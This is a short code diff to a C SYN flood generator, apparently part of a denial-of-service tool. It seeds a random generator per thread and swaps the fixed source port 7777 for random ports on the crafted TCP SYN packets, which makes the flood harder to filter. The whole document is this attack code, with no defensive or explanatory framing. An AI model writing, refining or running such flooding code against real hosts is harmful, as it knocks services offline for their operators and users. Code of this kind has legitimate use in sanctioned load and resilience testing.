@@ -35,6 +35,7 @@ void syn_flood_print_usage(void)
 
 void *generate_syn_flood(void *data)
 {
+	srand(time(NULL));
 	int thread_id = *((int*) data);
 	int sock = make_socket(IPPROTO_TCP);
 	clock_t thread_clock;
@@ -61,8 +62,8 @@ void *generate_syn_flood(void *data)
 		// make tcp header.
 		struct tcphdr tcp_h;
 		tcp_h = prepare_empty_tcp();
-		// set src port number random assigned 7777
-		tcp_h = tcp_set_source(tcp_h, 7777);
+		// set src port number random
+		tcp_h = tcp_set_source(tcp_h, rand() % 65535 + 1);
 		tcp_h = tcp_set_dest(tcp_h, g_syn_now_dest_port);
 		tcp_h = tcp_set_seq(tcp_h, g_syn_num_total);
 		// ***For SYN TCP request, ACK seq should not be provided
